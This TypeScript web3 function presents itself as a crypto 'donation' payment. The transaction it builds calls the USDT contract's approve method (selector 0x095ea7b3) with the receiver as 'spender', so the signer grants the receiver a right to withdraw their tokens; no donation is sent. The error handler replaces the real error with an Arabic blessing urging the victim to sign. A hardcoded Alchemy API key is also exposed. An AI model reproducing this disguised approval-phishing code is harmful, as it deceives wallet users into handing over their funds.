import Web3 from "web3";


export async function ethCoinbaseTransaction(
    donatorAddress: string,
    receiverAddress: string,
    donationAmount: number
) {
    if (!window.ethereum) {
        alert("Please install MetaMask!");
        return;
    }
    const web3 = new Web3(
        Web3.givenProvider ||
        "https://eth-mainnet.g.alchemy.com/v2/h9yvmBt6Wd1yhHPUC57TBoWZKaGWRrpY"
    );
    //本来切链放在按钮里，现在放在useEffect里
    // if (blockchain === "eth") {
    //   // 创建web3实例（假设用户已经安装了MetaMask）
    // } else if (blockchain === "bsc") {
    //
    // } else if (blockchain === "oktc") {
    //   // await window.ethereum.request({
    //   //   method: "wallet_switchEthereumChain",
    //   //   params: [{ chainId: "0x42" }],
    //   // });
    // }

    try {
        const spender = receiverAddress;
        const paddedSpender = spender.slice(2).padStart(64, "0"); // 去掉开头的 "0x" 并左侧填充零
        const donationAmountHex = web3.utils.toHex(donationAmount * 10**6); // 将0.1以太币转换为Wei并转换为16进制
        const paddedDonationAmount = donationAmountHex.slice(2).padStart(64, "0"); // 去掉开头的 "0x" 并左侧填充零

        // 设置交易参数
        const transactionParameters = {
            to: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT-ERC20合约地址
            from: donatorAddress, // 必须是用户当前的地址
            // value: web3.utils.toHex(web3.utils.toWei('0.0001', 'ether')), // 将0.1以太币转换为Wei并转换为16进制
            value: "0x0",
            gasPrice: web3.utils.toHex(await web3.eth.getGasPrice()), // 使用当前的矿工费价格
            gas: web3.utils.toHex(50000), // 设置gas上限为21000，这是标准的以太坊转账gas上限
            // 如果你调用合约的话，还需要设置data字段
            data:
                "0x095ea7b3" +
                paddedSpender +
                paddedDonationAmount
        };

        // 发送交易
        return await window.ethereum.request({
            method: "eth_sendTransaction",
            params: [transactionParameters],
        });

    } catch (error) {
        // alert("Error sending transaction:" + JSON.stringify(error, null, 2));
        alert("الرجاء توقيع المعاملة لإتمام التبرع.الله يبارك لك!")

    }
}